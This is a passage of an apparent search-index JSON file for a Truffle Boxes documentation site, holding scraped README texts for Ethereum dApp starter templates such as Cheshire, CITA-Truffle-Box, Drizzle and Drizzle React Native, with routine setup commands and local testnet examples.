terminal (i.e. not in the truffle develop prompt)\\n// ensure you are inside the app directory when running this\\ntruffle migrate --network besu\\n```\\n\\n6. To run the Nestjs server\\n```javascript\\n// in another terminal (i.e. not in the truffle develop prompt)\\n// ensure you are inside the app directory when running this\\nnpm run start:dev\\n```\\n\\n7. In a window terminal type \\n```\\n// in another terminal (i.e. not in the truffle develop prompt)\\n// ensure you are inside the app directory when running this\\ncurl http://localhost:3000/balance/0xFE3B557E8Fb62b89F4916B721be55cEb828dBd73 \\n```\\nAs you can see this address holds all the metaCoin tokens accordin to the business logic implemented into the smart contract. Below the response\\n```\\n{\"address\":\"0xFE3B557E8Fb62b89F4916B721be55cEb828dBd73\",\"balance\":\"10000\"}\\n```\\n\\n8. Set the variable `metaCoinAddress` (client_script/utils.js) to match the deployed MetaCoin address from `truffle migrate`. You can get the smart contract address by typing\\n```\\n// in another terminal (i.e. not in the truffle develop prompt)\\n// ensure you are inside the app directory when running this\\ntruffle networks | grep -i metacoin\\n```\\n9. Launch the transfer script\\n```javascript\\n// in another terminal (i.e. not in the truffle develop prompt)\\n// ensure you are inside the app directory when running this\\nnpm run transfer\\n```\\n\\n10. The second address will receive 10 tokens from the first one. In a window terminal type \\n```\\n// in another terminal (i.e. not in the truffle develop prompt)\\n// ensure you are inside the app directory when running this\\ncurl http://localhost:3000/balance/0x627306090abaB3A6e1400e9345bC60c78a8BEf57\\n```\\nBelow the response\\n```\\n{\"address\":\"0x627306090abaB3A6e1400e9345bC60c78a8BEf57\",\"balance\":\"10\"}\\n```\\n\\n11. For web service monitoring and performance metrics you can enable the APM agent in the main.ts file and visualize the incoming requests with kibana. [Read More](https://www.elastic.co/guide/en/apm/agent/nodejs/current/index.html)\\n\\n**Contributors**\\n1. [Giuseppe Gaetano Illuzzi](https://github.com/illuzzig)\\n'","title":"Index"},{"location":"boxes/besu-drizzle-truffle-box/index.html","text":"/* Hide table of contents */ @media screen and (min-width: 60em) { .md-sidebar--secondary { display: none; } } /* Hide navigation */ @media screen and (min-width: 76.25em) { .md-sidebar--primary { display: none; } } /* Hide page header */ .md-content__inner h1 { display: none; } TAGS besu-drizzle-truffle-box CREATED UPDATED STARS INSTALL ... REPOSITORY GitHub Download Please wait : Fetching readme... niiice","title":"Index"},{"location":"boxes/blueprint/index.html","text":"/* Hide table of contents */ @media screen and (min-width: 60em) { .md-sidebar--secondary { display: none; } } /* Hide navigation */ @media screen and (min-width: 76.25em) { .md-sidebar--primary { display: none; } } /* Hide page header */ .md-content__inner h1 { display: none; } TAGS blueprint-box CREATED UPDATED STARS INSTALL ... REPOSITORY GitHub Download Please wait : Fetching readme... b\"# Blueprint Truffle Box\\n\\nThis box comes with everything you need to create your own Truffle Box.\\n\\n## Getting Started\\n\\nAfter adding your libraries and code:\\n\\n1. Delete `box-img-sm.png` and `box-img-lg.png`.\\n\\n2. Use `box-img-sm-template.png` and `box-img-lg-template.png` to create your own art.\\n\\n3. Delete the template images and replace them with your art. Be sure your art's filenames don't have -template in them.\\n\\n4. Customize the box configuration file (`truffle-box.json`) if necessary.\\n\\nSee [the Truffle Box section of our documentation](https://truffleframework.com/docs/truffle/advanced/creating-a-truffle-box/) for more info.\\n\"","title":"Index"},{"location":"boxes/box/index.html","text":"/* Hide table of contents */ @media screen and (min-width: 60em) { .md-sidebar--secondary { display: none; } } /* Hide navigation */ @media screen and (min-width: 76.25em) { .md-sidebar--primary { display: none; } } /* Hide page header */ .md-content__inner h1 { display: none; } TAGS box CREATED UPDATED STARS INSTALL ... REPOSITORY GitHub Download Please wait : Fetching readme... niiice","title":"Index"},{"location":"boxes/cheshire/index.html","text":"/* Hide table of contents */ @media screen and (min-width: 60em) { .md-sidebar--secondary { display: none; } } /* Hide navigation */ @media screen and (min-width: 76.25em) { .md-sidebar--primary { display: none; } } /* Hide page header */ .md-content__inner h1 { display: none; } TAGS cheshire CREATED UPDATED STARS INSTALL ... REPOSITORY GitHub Download Please wait : Fetching readme... b'[![CircleCI](https://circleci.com/gh/endless-nameless-inc/cheshire/tree/master.svg?style=shield)](https://circleci.com/gh/endless-nameless-inc/cheshire/tree/master)\\n[![Coverage Status](https://coveralls.io/repos/github/endless-nameless-inc/cheshire/badge.svg?branch=master)](https://coveralls.io/github/endless-nameless-inc/cheshire?branch=master)\\n\\n# Cheshire\\n\\nCheshire enables fast CryptoKitties dApp development by providing local implementations of the CryptoKitties web API and smart contracts. It features:\\n\\n1. An **Ethereum testnet** running the CryptoKitties smart contracts\\n\\n2. An HTTP server running a **minimal implementation of the CryptoKitties web API**:\\n * `/kitties`\\n * `/kitties/:id`\\n * `/user/:address`\\n\\n3. A simple **Node.js framework** for seeding the development environment with realistic data and bootstraping your dApp\\n\\nCheshire has simplified and accelerated development at [Endless Nameless](http://endlessnameless.com) considerably. We\\'re excited to share it.\\n\\n## Installation\\n\\nYou can install Cheshire with git or as a [Truffle Box](http://truffleframework.com/boxes/).\\n\\n### Git\\n\\n```bash\\ngit clone http://github.com/endless-nameless-inc/cheshire\\ncd cheshire\\nyarn install\\n```\\n\\n### Truffle box\\n\\n```bash\\ntruffle unbox endless-nameless-inc/cheshire\\n```\\n\\n## Usage\\n\\nCheshire is meant to be used with the [Truffle Framework](http://truffleframework.com/), but can function as a standalone service, depending on your workflow.\\n\\n### Start Cheshire\\n\\nTo start Cheshire, run:\\n\\n`yarn start`\\n\\nThis does the following:\\n\\n1. Starts an Ethereum testnet ([ganache-cli](https://github.com/trufflesuite/ganache-cli))\\n2. Deploys CryptoKitties\\'s [KittyCore](https://etherscan.io/address/0x06012c8cf97bead5deae237070f9587f8e7a266d#code), [SaleClockAuction](https://etherscan.io/address/0xb1690c08e213a35ed9bab7b318de14420fb57d8c#code), and [SiringClockAuction](https://etherscan.io/address/0xc7af99fe5513eb6710e6d5f44f9989da40f27f26#code) contracts to the testnet\\n3. Starts a local CryptoKitties API server\\n4. Executes `/scripts/setup.js`\\n\\nThe output should look something like this:\\n\\n```\\n> Starting database...\\n> Starting testnet...\\n> Compiling contracts...\\n> Deploying CryptoKitties contracts to testnet...\\n> Starting local CryptoKitties API server...\\n> Running setup script...\\n\\nCheshire is live \\xf0\\x9f\\x98\\xba Here\\'s what\\'s inside:\\n\\nAvailable Accounts\\n====================\\n(0) 0x182fc09c33fdd6c2f5b2562f3ca721fa954689c8\\n ...\\n(9) 0xcdf40e926a778d93429b72c341b4a9e0ee8624c4\\n\\nPrivate Keys\\n====================\\n(0) 0x76a67ae288fd67ea8d4f7fb94f50c36b606d9448db579584af90d52105f9d8cf\\n ...\\n(9) 0x6e77cfded732de6d423abcaccc45ee8c4bdc2eb3c0c47938acb386ac17c496b8\\n\\nTestnet Contracts\\n====================\\nKittyCore: 0xa751b62893867d0608a2ada5d17d0c43e3433040\\nSaleClockAuction: 0x1ab49d53d0bff0202ec4b330349b427155bba7ac\\nSiringClockAuction: 0x671843106e07f9d835d7299381cd14863af18593\\n\\nServices\\n====================\\nEthereum testnet listening on port 8546\\nCryptoKitties API listening on port 4000\\nCheshire dashboard available at http://localhost:4000\\n\\nView the above at any time by running `yarn run help`\\n```\\n\\nEureka! When Cheshire\\'s running, you have your very own local copy of CryptoKitties, enabling you to build your dApp with the speed and convenience of testnet. Let\\'s try it out.\\n\\n### Interacting with your local CryptoKitties API\\n\\nCheshire automatically imports the Genesis kitty. To fetch the Genesis kitty from your local CryptoKitties API, run:\\n\\n```bash\\n$ curl http://localhost:4000/kitties/1\\n```\\n\\nThe response should look exactly like the response returned by CryptoKitties\\'s [production API](https://api.cryptokitties.co/kitties/1).\\n\\nSee the [scripts](#scripts) section below to learn how to seed your environment with more data.\\n\\n### Interacting with the testnet contracts\\n\\nTo interact with the testnet contracts, start by opening a Truffle console:\\n\\n```bash\\n$ truffle console --network cheshire\\n```\\n\\nThen, taking note of the KittyCore testnet address displayed when you started Cheshire, create an instance of KittyCore, and use the `getKitty` function to fetch the Genesis kitty\\'s genes:\\n\\n```bash\\ntruffle(cheshire)> // Be sure to replace the KittyCore address below\\ntruffle(cheshire)> kittyCore = KittyCore.at(\\'0xa751b62893867d0608a2ada5d17d0c43e3433040\\')\\ntruffle(cheshire)> kittyCore.getKitty(1)\\n```\\n\\nThe response should be pretty similar to the one you get from the [mainnet contract](https://etherscan.io/address/0x06012c8cf97bead5deae237070f9587f8e7a266d#readContract).\\n\\n## Suggested Conventions\\n\\nYou\\'ll get the most out of Cheshire by adopting these conventions:\\n\\n* Store your contracts in the `/contracts` directory\\n* Design the web application layers of your stack to reference Cheshire\\'s [environment variables](#cheshire-environment-variables) (hat tip to the [twelve-factor](https://12factor.net) methodology)\\n* Update your [setup script](#setup-script) to deploy your contracts to testnet\\n* Update your [setup script](#setup-script) to start your dApp\\'s web application\\n\\n## Scripts\\n\\nCheshire provides a simple scripting framework designed to help seed the development environment with realistic data, primarily by importing kitties from mainnet.\\n\\nA Cheshire script is just a Node.js module that runs in the context of the Cheshire environment.\\n\\nHere\\'s an example of a script that imports a [Bug Cat](https://www.cryptokitties.co/kitty/101) from mainnet to your testnet.\\n\\n```js\\n// /scripts/import-bug-cat.js\\nmodule.exports = async function importBugCat(cheshire) {\\n const bugCatIdMainnet = 101\\n const ownerTestnet = cheshire.accounts[0].address\\n const kittyIdTestnet = await cheshire.importKitty(bugCatIdMainnet, ownerTestnet)\\n\\n console.log(`Kitty #${kittyIdTestnet} => ${ownerTestnet}`)\\n}\\n```\\n\\nTo run this script, you would execute the following command:\\n\\n```sh\\n$ yarn run script ./scripts/import-bug-cat.js\\n```\\n\\nThe output would look something like:\\n\\n```txt\\nKitty #2 => 0x182fc09c33fdd6c2f5b2562f3ca721fa954689c8\\n```\\n\\n### Setup Script\\n\\nCheshire executes `/scripts/setup.js` when started. You should update the `setup.js` shipped with Cheshire to:\\n\\n1. Deploy your dApp\\'s contracts to testnet. For example:\\n\\n ```\\n const kittyRace = await cheshire.deployContract(\\'KittyRace\\', process.env.ADDRESS_KITTY_CORE)\\n log(\\'KittyRace deployed at:\\', kittyRace.address)\\n ```\\n\\n2. Start your dApp\\'s web application, so it inherits the various [environment variables](#cheshire-environment-variables) set by Cheshire.\\n\\n We recommend adopting the convention in the `setup.js` shipped with Cheshire which simply expects the `APP_START` environment variable to contain a command that starts your dApp\\'s web application.\\n\\n For example:\\n\\n ```\\n APP_START=\"cd ~/Projects/kittyrace-web; bundle exec rails server\" yarn start\\n ```\\n\\nYou can run any script in place of `setup.js` by passing its path to `yarn start`. This is handy for setting up specific scenarios, such as a KittyRace with 9 registered racers:\\n\\n```sh\\nyarn start ./scripts/setup-registered-racers.js 9\\n```\\n\\n### Cheshire API Reference\\n\\nCheshire scripts receive an instance of the Cheshire class with these methods:\\n\\n#### `accounts()`\\nReturns array of available Ethereum accounts (the same accounts defined in config.json)\\n\\n#### `contractAddress(contractName)`\\nReturns address of `contractName`\\n\\n#### `contractInstance(contractName)`\\nReturns an instance of `contractName` as a `web3.eth.contract` object\\n\\n#### `createKitty(matronId, sireId, generation, genes, owner, apiObject)`\\nCreate a kitty with the given parameters.\\n\\nReturns the kitty\\'s ID.\\n\\n#### `async deployContract(contractName, ...constructorArgs)`\\nDeploy `contractName` to testnet.\\n\\nCheshire compiles all contracts in `/contracts` at start time. Expects `/contracts/ContractName.sol` to exist.\\n\\nReturns an instance of `contractName` as a `web3.eth.contract` object\\n\\n#### `async importKitty(kittyIdMainnet, ownerTestnet)`\\nImport a kitty from mainnet, and assign it to `ownerTestnet`\\n\\nReturns the testnet kitty\\'s ID.\\n\\n#### `async importUser(addressMainnet, addressTestnet)`\\nImport user\\'s profile and kitties from mainnet, and assign to `addressTestnet`.\\n\\nReturns address of testnet user.\\n\\n### Cheshire Environment Variables\\n\\nCheshire sets several environment variables before running any script:\\n\\n* `ADDRESS_KITTY_CORE`\\n* `ADDRESS_SALE_CLOCK_AUCTION`\\n* `ADDRESS_SIRING_CLOCK_AUCTION`\\n* `URL_CRYPTO_KITTIES_API`\\n\\nIn addition to these, the address for any contract deployed with a Cheshire script will be stored in an environment variable named with the convention, `ADDRESS_ `.\\n\\n## Configuration\\n\\nThe `config.json` file defines the following:\\n\\n* `accounts` - list of Ethereum accounts to load into testnet\\n* `ethNodeMainnet` - URL for the node used to access the Ethereum mainnet\\n* `addressKittyCoreMainnet` - address of the mainnet KittyCore contract\\n* `portTestnet` - port bound by Ethereum testnet\\n* `portApi` - port bound by local CryptoKitties API\\n\\n## Utilities\\n\\n### Mine\\nTo mine some number of blocks on your testnet:\\n\\n`yarn run mine `\\n\\n### Help\\nPrint information about the environment including available Ethereum accounts, contract addresses, etc.\\n\\n`yarn run help`\\n\\n### Cheshire Dashboard\\nCheshire ships with a simple dashboard you can access at [http://localhost:4000](http://localhost:4000)\\n\\n## Developer notes\\n\\n### KittyCore\\n\\nThe smart contracts bundled with Cheshire are identical to those in production except for KittyCore, to which we\\'ve added an `external` `createKitty` function that lets us push kitties into the local testnet contract.\\n\\n```solidity\\nfunction createKitty(\\n uint256 _matronId,\\n uint256 _sireId,\\n uint256 _generation,\\n uint256 _genes,\\n address _owner\\n)\\n external\\n returns (uint)\\n{\\n return _createKitty(_matronId, _sireId, _generation, _genes, _owner);\\n}\\n```\\n\\n### Contributions\\n\\nCheshire works pretty well for us at [Endless Nameless](http://endlessnameless.com), but there\\'s probably a whole lot more it could do!\\n\\nIf you\\'re interested in contributing, we humbly request the following:\\n\\n1. Adhere to Airbnb\\'s [JavaScript style guide](https://github.com/airbnb/javascript) (`yarn eslint` makes it easy)\\n\\n2. Include tests. We\\'re happy when `yarn test` is happy, and `yarn test` is only happy when coverage is 100% \\xf0\\x9f\\xa4\\x93\\n\\n## Acknowledgements\\n\\nWe\\'re grateful for the contributions of the many open source projects on which Cheshire depends, none more so than the excellent [Truffle Suite](https://github.com/trufflesuite/).\\n\\nCheshire is by [Endless Nameless](http://endlessnameless.com). It is based on tools and processes we developed while building [KittyRace](https://kittyrace.com), a CryptoKitties dApp. We hope Cheshire makes it easier to #buidl \\xf0\\x9f\\xa4\\x98\\n\\n_Your name here_ - we will gladly review PRs.\\n'","title":"Index"},{"location":"boxes/cita-truffle-box/index.html","text":"/* Hide table of contents */ @media screen and (min-width: 60em) { .md-sidebar--secondary { display: none; } } /* Hide navigation */ @media screen and (min-width: 76.25em) { .md-sidebar--primary { display: none; } } /* Hide page header */ .md-content__inner h1 { display: none; } TAGS cita-truffle-box CREATED UPDATED STARS INSTALL ... REPOSITORY GitHub Download Please wait : Fetching readme... b\"[![CITAHub](https://img.shields.io/badge/made%20for-CITAHub-blue.svg)](https://www.citahub.com/)\\n\\n# CITA-Truffle-Box\\n\\nEnglish | [\\xe7\\xae\\x80\\xe4\\xbd\\x93\\xe4\\xb8\\xad\\xe6\\x96\\x87](./README-CN.md)\\n\\nCITA-Truffle-Box is based on [truffle-box](https://github.com/truffle-box) to develop and used for developing DApps on CITA.\\nPlease refer to[our document](https://docs.citahub.com/en-US/cita/cita-intro) for more details about CITA.\\n\\n>Notice: This project rewrite truffle migrate part of [truffle-box](https://github.com/truffle-box), please read truffle-tutorial first, especially [RUNNING MIGRATIONS ](https://truffleframework.com/docs/truffle/getting-started/running-migrations) part.\\n\\n## Installation\\n\\n1. Install Truffle globally\\n\\nTo use CITA-Truffle-Box, please install truffle.\\n```shell\\nyarn global add truffle\\n```\\n\\n2. Download\\n\\n```shell\\ngit clone https://github.com/cryptape/cita-truffle-box.git\\ncd cita-truffle-box/\\nrm -rf .git\\nyarn install\\n```\\n\\n\\n## Configuration\\n\\nYou can configure your box in `truffle.js`.\\n\\nThe configure options are shown below.\\n\\n```js\\nmodule.exports = {\\n networks: {\\n development: {\\n host: 'ip_address', // eg. '121.196.200.225'\\n port: 'port', // eg. 1337\\n network_id: '*', // Use '*' to match any network id\\n privateKey: 'private key', // a string, required\\n // the following parameters are OPTIONAL\\n // validUntilBlock: 999999, // an int, default to (current block number)+88\\n // nonce: '999', // a string, default to random int\\n // quota: 999999, // an int, defaut to 999999\\n }, // you can add other network after here\\n },\\n}\\n```\\n\\n### networks\\n\\nYou must use 'development' as the key for now.\\n\\n* `host`[required] \\nSpecify the host ip_address, don't add protocol name.\\n\\n* `port`[required] \\nSpecify the host port.\\n\\n* `network_id`[required] \\nIn order to be compatible with truffle, you have to set this attribute, but it's meaningless here.\\n\\n* `privateKey` [required] \\nYour private key for sending transaction.\\n\\n* `nonce` [optional] \\n Nonce is a string used to prevent double-spending, default to be a random number from 1 ~ 100.\\n Note that the type of `nonce` is string.\\n\\n* `quota` [optional] \\n Similar to gas in ethereum, default value is 99999.\\n\\n* `validUntilBlock` [optional] \\n Similar to timeout, default to be `current block height + 88`\\n\\n## Compile\\nCompile the smart contract.\\n```\\ntruffle compile\\n```\\n\\n## Migration\\n\\nFirst, add your migration scripts in `/migration`, for the details, please refer [RUNNING MIGRATIONS](https://truffleframework.com/docs/truffle/getting-started/running-migrations) for more details.\\n\\nInput the command to do migration. (Note that we can **NOT** use `truffle migrate` command here...)\\n```\\nyarn migrate\\n```\\n\"","title":"Index"},{"location":"boxes/dappstarter-trufflebox/index.html","text":"/* Hide table of contents */ @media screen and (min-width: 60em) { .md-sidebar--secondary { display: none; } } /* Hide navigation */ @media screen and (min-width: 76.25em) { .md-sidebar--primary { display: none; } } /* Hide page header */ .md-content__inner h1 { display: none; } TAGS dappstarter-trufflebox CREATED UPDATED STARS INSTALL ... REPOSITORY GitHub Download Please wait : Fetching readme... niiice","title":"Index"},{"location":"boxes/drizzle/index.html","text":"Drizzle Truffle Box \u00b6 This box comes with everything you need to start using smart contracts from a react app with Drizzle. It includes drizzle , drizzle-react and drizzle-react-components to give you a complete overview of Drizzle's capabilities. Installation \u00b6 First ensure you are in a new and empty directory. Run the unbox command via npx and skip to step 3. This will install all necessary dependencies. A Create-React-App is generated in the app directory. npx truffle unbox drizzle Alternatively, you can install Truffle globally and run the unbox command. npm install - g truffle truffle unbox drizzle Run the development console. truffle develop Compile and migrate the smart contracts. Note inside the development console we don't preface commands with truffle . compile migrate In the app directory, we run the React app. Smart contract changes must be manually recompiled and migrated. // in another terminal (i.e. not in the truffle develop prompt) cd app npm run start Truffle can run tests written in Solidity or JavaScript against your smart contracts. Note the command varies slightly if you're in or outside of the development console. // inside the development console test // outside the development console truffle test Jest is included for testing React components. Compile your contracts before running Jest, or you may receive some file not found errors. // ensure you are inside the app directory when running this npm run test To build the application for production, use the build script. A production build will be in the app/build folder. // ensure you are inside the app directory when running this npm run build FAQ \u00b6 Where do I find more information about Drizzle? Check out our documentation or any of the three repositories ( drizzle , drizzle-react , drizzle-react-components ). Where is my production build? The production build will be in the app/build folder after running npm run build in the app folder. Where can I find more documentation? This box is a marriage of Truffle and a React setup created with create-react-app . Either one would be a great place to start!","title":"Drizzle Truffle Box"},{"location":"boxes/drizzle/index.html#drizzle-truffle-box","text":"This box comes with everything you need to start using smart contracts from a react app with Drizzle. It includes drizzle , drizzle-react and drizzle-react-components to give you a complete overview of Drizzle's capabilities.","title":"Drizzle Truffle Box"},{"location":"boxes/drizzle/index.html#installation","text":"First ensure you are in a new and empty directory. Run the unbox command via npx and skip to step 3. This will install all necessary dependencies. A Create-React-App is generated in the app directory. npx truffle unbox drizzle Alternatively, you can install Truffle globally and run the unbox command. npm install - g truffle truffle unbox drizzle Run the development console. truffle develop Compile and migrate the smart contracts. Note inside the development console we don't preface commands with truffle . compile migrate In the app directory, we run the React app. Smart contract changes must be manually recompiled and migrated. // in another terminal (i.e. not in the truffle develop prompt) cd app npm run start Truffle can run tests written in Solidity or JavaScript against your smart contracts. Note the command varies slightly if you're in or outside of the development console. // inside the development console test // outside the development console truffle test Jest is included for testing React components. Compile your contracts before running Jest, or you may receive some file not found errors. // ensure you are inside the app directory when running this npm run test To build the application for production, use the build script. A production build will be in the app/build folder. // ensure you are inside the app directory when running this npm run build","title":"Installation"},{"location":"boxes/drizzle/index.html#faq","text":"Where do I find more information about Drizzle? Check out our documentation or any of the three repositories ( drizzle , drizzle-react , drizzle-react-components ). Where is my production build? The production build will be in the app/build folder after running npm run build in the app folder. Where can I find more documentation? This box is a marriage of Truffle and a React setup created with create-react-app . Either one would be a great place to start!","title":"FAQ"},{"location":"boxes/drizzle-kaleido-box/index.html","text":"/* Hide table of contents */ @media screen and (min-width: 60em) { .md-sidebar--secondary { display: none; } } /* Hide navigation */ @media screen and (min-width: 76.25em) { .md-sidebar--primary { display: none; } } /* Hide page header */ .md-content__inner h1 { display: none; } TAGS drizzle-kaleido-box CREATED UPDATED STARS INSTALL ... REPOSITORY GitHub Download Please wait : Fetching readme... b'![Drizzle & Kaleido](https://github.com/kaleido-io/drizzle-kaleido-box/blob/master/box-img-sm.png \"Drizzle & Kaleido\")\\n\\n# Drizzle & Kaleido Truffle Box\\n\\nThis box gives you a boilerplate to get up and running quickly with Drizzle & Truffle on a Kaleido chain.\\n\\n## Installation\\n\\nFirst ensure you are in a new and empty directory.\\n\\n1. Run the `unbox` command with `npx` and skip to step 3. This will install all necessary dependencies.\\n\\n```\\nnpx truffle unbox kaleido-io/drizzle-kaleido-box\\n```\\n\\n2. Alternatively, you can install Truffle globally and then run the `unbox` command.\\n\\n```\\nnpm install -g truffle\\ntruffle unbox kaleido-io/drizzle-kaleido-box\\n```\\n\\n3. Run the development console. This will instantiate a local chain for you to test that Truffle is working properly.\\n\\n```\\ntruffle develop\\n```\\n\\n4. Ensure that you\\'re able to both compile, test, and finally migrate your contracts to your local chain.\\n\\n```\\ncompile\\ntest\\nmigrate\\n```\\n\\n5. If everything looks good, you can exit the Truffle console with `.exit`.\\n\\n## Connect to Kaleido\\n\\n1. In Kaleido, select the node you want to connect to, then choose `+ Connect Node`.\\n\\n2. Select `Native JSON/RPC`\\n\\n3. Choose an application credential to use for this connection.\\n\\n4. Choose the `Truffle Suite` connection type.\\n\\n5. Copy the connection info from this panel into the respective variables inside of `truffle-config.js`. If you are using Quorum in this environment, ensure to uncomment the `type: \"quorum\"` property on your network object.\\n\\n```\\nconst appCred = \\'yourappcred\\';\\nconst connectionURL = \\'nodeConnectionURL\\';\\n```\\n```\\ntype: \\'quorum\\' // Use this property for Quorum environments\\n```\\n\\n6. Migrate your contracts to your Kaleido chain!\\n\\n```\\ntruffle migrate\\n```\\n\\n## Connect MetaMask to your Kaleido Chain\\n\\n1. In the `Networks` switcher in MetaMask, choose `Custom RPC`.\\n\\n2. Find the `New Network` section, and click `Advanced Options`. Add the `MetaMask RPC URL` from the connect panel, and give your network a nickname.\\n\\n## Start Your React App\\n\\n1. Open the `/app` directory and start the development server.\\n```\\ncd app && npm run start\\n```\\n\\n2. The development server will open a browser at `http://localhost:3000` by default.\\n\\n3. Attempt to change the `Stored Value` of `SimpleStorage` -- you should see the refresh icon until the transaction is confirmed, at which point the `Stored Value` of `SimpleStorage` should automatically update.\\n'","title":"Index"},{"location":"boxes/drizzle-react-native/index.html","text":"Drizzle React Native Box \u00b6 This box will get you up and running with building a dapp on React Native (Android and iOS). Installation \u00b6 Install Truffle and Ganache CLI globally npm install -g truffle npm install -g ganache-cli Download the box. This also takes care of installing the necessary dependencies. truffle unbox drizzle-react-native Go through the React Native tutorial . Make sure to select Building Projects with Native Code since we will be leveraging some native code. Connecting your app to your Ganache testnet \u00b6 When we're Working with React Native and mobile apps, accessing the Ganache server that's running on your machine takes a bit more work than when we are building web apps. The sections below detail how to connect to the Ganache testnet with your mobile device/emulator. Running the app \u00b6 Start React Native Metro bundler: react-native start Start your emulator/plug in your device Android (Emulator/Physical Device) \u00b6 The main thing for Android devices is that we have to reverse the ports so that we can point to localhost on the Android device to the Ganache server. Make sure you've setup the Android Debug Bridge (adb) before doing these steps. Start ganache-cli : ganache-cli -b 3 Compile and migrate contracts: truffle compile && truffle migrate Reverse ports: adb reverse tcp:8545 tcp:8545 Install app: react-native run-android iOS \u00b6 Simulator \u00b6 The iOS simulator will see servers on localhost just fine. Start ganache-cli : ganache-cli -b 3 Compile and migrate contracts: truffle compile && truffle migrate Install app: react-native run-ios (you can also do this through Xcode) Physical device \u00b6 iOS physical devices involve the most manual work relative to other devices. You have to look up the local IP address of your machine and manually handle it every time it changes. Find your LOCAL_MACHINE_IP by checking your network settings on your Mac where Ganache is running Start ganache-cli : ganache-cli -b 3 -h LOCAL_MACHINE_IP In truffle.js for development , point Truffle to LOCAL_MACHINE_IP Compile and migrate contracts: truffle compile && truffle migrate In index.js , point Drizzle to LOCAL_MACHINE_IP const options = { ... web3 : { fallback : { type : \"ws\" , url : \"ws://LOCAL_MACHINE_IP:8545\" } } }; Install: Do it through Xcode","title":"Drizzle React Native Box"},{"location":"boxes/drizzle-react-native/index.html#drizzle-react-native-box","text":"This box will get you up and running with building a dapp on React Native (Android and iOS).","title":"Drizzle React Native Box"},{"location":"boxes/drizzle-react-native/index.html#installation","text":"Install Truffle and Ganache CLI globally npm install -g truffle npm install -g ganache-cli Download the box. This also takes care of installing the necessary dependencies. truffle unbox drizzle-react-native Go through the React Native tutorial . Make sure to select Building Projects with Native Code since we will be leveraging some native code.","title":"Installation"},{"location":"boxes/drizzle-react-native/index.html#connecting-your-app-to-your-ganache-testnet","text":"When we're Working with React Native and mobile apps, accessing the Ganache server that's running on your machine takes a bit more work than when we are building web apps. The sections below detail how to connect to the Ganache testnet with your mobile device/emulator.","title":"Connecting your app to your Ganache testnet"},{"location":"boxes/drizzle-react-native/index.html#running-the-app","text":"Start React Native Metro bundler: react-native start Start your emulator/plug in your device","title":"Running the app"},{"location":"boxes/drizzle-react-native/index.html#android-emulatorphysical-device","text":"The main thing for Android devices is that we have to reverse the ports so that we can point to localhost on the Android device to the Ganache server. Make sure you've setup the Android Debug Bridge (adb) before doing these steps. Start ganache-cli : ganache-cli -b 3 Compile and migrate contracts: truffle compile && truffle migrate Reverse ports: adb reverse tcp:8545 tcp:8545 Install app: react-native run-android","title":"Android (Emulator/Physical Device)"},{"location":"boxes/drizzle-react-native/index.html#ios","text":"","title":"iOS"},{"location":"boxes/drizzle-react-native/index.html#simulator","text":"The iOS simulator will see servers on localhost just fine. Start ganache-cli : ganache-cli -b 3 Compile and migrate contracts: truffle compile && truffle migrate Install app: react-native run-ios (you can also do this through Xcode)","title":"Simulator"},{"location":"boxes/drizzle-react-native/index.html#physical-device","text":"iOS physical devices involve the most manual work relative to other devices. You have to look up the local IP address of your machine and manually handle it every time it changes. Find your LOCAL_MACHINE_IP by checking your network settings on your Mac where Ganache is running Start ganache-cli : ganache-cli -b 3 -h LOCAL_MACHINE_IP In truffle.js for development , point Truffle to LOCAL_MACHINE_IP Compile and migrate contracts: truffle compile && truffle migrate In index.js , point Drizzle to LOCAL_MACHINE_IP const options = { ... web3 : { fallback : { type : \"ws\" , url : \"ws://LOCAL_MACHINE_IP:8545\" } } }; Install: Do it through Xcode","title":"Physical device"},{"location":"boxes/drizzle-truffle-ganache-docker-box/index.html","text":"/* Hide table of contents */ @media screen and (min-width: 60em) { .md-sidebar--secondary { display: none; } } /* Hide navigation */ @media screen and (min-width: 76.25em) { .md-sidebar--primary { display: none; } } /* Hide page header */ .md-content__inner h1 { display: none; } TAGS drizzle-truffle-ganache-docker-box CREATED UPDATED STARS INSTALL ... REPOSITORY GitHub Download Please wait : Fetching readme... b'# Drizzle Truffle Ganache Docker Box\\n\\nThis box followed the official drizzle tutorial (https://www.trufflesuite.com/tutorials/getting-started-with-drizzle-and-react), but built on top of docker/docker-compose.\\n\\nThere are two docker services in `docker-compose`:\\n\\n- ganache-cli (located at /ganache/..):\\n - Build on top of the official ganache image `trufflesuite/ganache-cli:latest` \\n - Modified `ENTRYPOINT` to run script `ganache_with_accounts.sh`, so that everytime ganache restarts, the same Ethereum accounts were created.\\n - Port `8545:8545`\\n\\n- truffle-drizzle (located at /truffledrizzle/..)\\n - Build on top of `node:10`\\n - During the build stage, it will perform the following in order:\\n - Install truffle\\n - Move contract files\\n - Move React files.\\n - `npm ci`\\n - During the run stage, it will perform the following in order:\\n - truffle build\\n - truffle test\\n - truffle migrate\\n - copy compiled contracts to the react project\\n - run the react project\\n - Note that since we created a volume for the React project (`- ./truffledrizzle/client/src:/client/src`), the front end code supports hot editing.\\n \\nA few more things worth to mention:\\n\\n`dev_build.sh` builds the docker images according to `docker-compose-dev.yml`\\n`dev_run.sh` starts the docker-compose as defined in `docker-compose-dev.yml`\\n`npm_install.sh` creates a temp node container, in case we want to modify `package-lock.json`. (This project does not require node to be installed on local machine! :)\\n'","title":"Index"},{"location":"boxes/drizzle-tutorial-with-react-hooks/index.html","text":"/* Hide table of contents */ @media screen and (min-width: 60em) { .md-sidebar--secondary { display: none; } } /* Hide navigation */ @media screen and (min-width: 76.25em) { .md-sidebar--primary { display: none; } } /* Hide page header */ .md-content__inner h1 { display: none; } TAGS drizzle-tutorial-with-react-hooks CREATED UPDATED STARS INSTALL ... REPOSITORY GitHub Download Please wait : Fetching readme... b'# Drizzle tutorial with React Hooks\\n\\n \\n\\nI created a complete **React Hooks** version of this [**Drizzle tutorial**](https://www.trufflesuite.com/tutorials/getting-started-with-drizzle-and-react).\\n\\n![DApp demo](https://media.giphy.com/media/TdQVda1SmPNaU2gN4J/giphy.gif)\\n\\nYou will need to install Node.js and Truffle, as stated in the tutorial - see \"Setting up the development environment\".\\n\\nSee the ReactJS [guidance on using hooks](https://reactjs.org/docs/hooks-reference.html) and [Drizzle](https://www.trufflesuite.com/drizzle) for further details on implementing hooks in your project.\\n\\n## To get this box ##\\n\\n1. Create a new directory.\\n\\n2. In the new directory, run ```truffle unbox atkinsonholly/Drizzle-tutorial-with-React-Hooks```. This should pull the box contents to the new local directory.\\n\\n## After unboxing ##\\n\\nIn the client directory:\\n\\n```\\nnpm install\\n```\\n\\n\\nIn the main project 